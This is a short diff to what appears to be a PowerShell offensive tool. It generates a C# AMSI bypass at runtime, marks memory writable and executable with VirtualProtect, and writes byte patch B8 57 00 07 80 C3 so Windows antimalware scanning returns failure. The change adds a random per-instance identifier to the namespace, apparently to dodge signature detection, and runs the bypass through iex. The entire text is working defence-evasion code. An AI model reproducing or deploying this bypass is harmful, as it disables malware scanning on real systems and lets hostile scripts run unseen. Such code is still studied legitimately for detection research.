@@ -40,7 +40,7 @@ function Invoke-Bypass-$id-AMSI2 {
 using System;
 using System.Runtime.InteropServices;
 
-namespace Bypass
+namespace Bypass$id
 {
     public class AMSI$id
     {
@@ -68,7 +68,7 @@ namespace Bypass
             UIntPtr size = (UIntPtr)5;
             uint p = 0;
             VirtualProtect(Address, size, 0x40, out p);
-            byte c1=0xB8,c2=0x80;			 
+            byte c1=0xB8,c2=0x80;
             Byte[] Patch = {c1, 0x57, 0x00, 0x07, c2, 0xC3 };
             IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
             Marshal.Copy(Patch, 0, unmanagedPointer, 6);
@@ -81,7 +81,7 @@ namespace Bypass
 `"@;
 
     Add-Type -ReferencedAssemblies `$Ref -TypeDefinition `$Source -Language CSharp;
-    iex "[Bypass.AMSI$id]::Disable() | Out-Null"
+    iex "[Bypass$id.AMSI$id]::Disable() | Out-Null"
 }
 "@;
 
